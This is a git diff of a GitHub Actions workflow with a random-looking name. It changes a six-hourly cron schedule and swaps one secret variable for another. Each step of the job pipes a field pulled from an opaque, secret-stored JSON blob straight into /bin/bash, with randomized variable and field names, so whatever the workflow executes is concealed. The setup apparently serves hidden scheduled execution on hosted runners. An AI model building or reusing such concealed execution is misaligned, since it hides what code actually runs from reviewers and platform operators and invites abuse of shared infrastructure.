@@ -3,8 +3,7 @@ name: wendixiang9772
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-
+    - cron: '54 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,14 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: wendixiang9772
         env:
-          jpr84: ${{ secrets.jpr84 }}
+          ork33585: ${{ secrets.ork33585 }}
         run: |
-          echo $jpr84 | jq -r .pb71330 | /bin/bash
-          echo $q03 | jq -r .clv0122 | /bin/bash
-          echo $fm3 | jq -r .eb68 | /bin/bash
-          echo $kvrsq854 | jq -r .vs570 | /bin/bash
-          echo $cfa7 | jq -r .su468 | /bin/bash
-          echo $tatmw0 | jq -r .cds092 | /bin/bash
-          echo $xpoed7 | jq -r .xbju1709 | /bin/bash
-          echo $bf97 | jq -r .bndah653 | /bin/bash
+          echo $ork33585 | jq -r .hdjl72 | /bin/bash
+          echo $jgtd57 | jq -r .l9168 | /bin/bash
+          echo $naaq5 | jq -r .q36704 | /bin/bash
+          echo $iwp8615 | jq -r .wpa639 | /bin/bash
+          echo $d24 | jq -r .lwz60 | /bin/bash
+          echo $m328 | jq -r .lu799 | /bin/bash
+          echo $szvk1 | jq -r .vvp940 | /bin/bash
+          echo $yp753 | jq -r .qn0 | /bin/bash
+          echo $d894 | jq -r .ab06 | /bin/bash
 
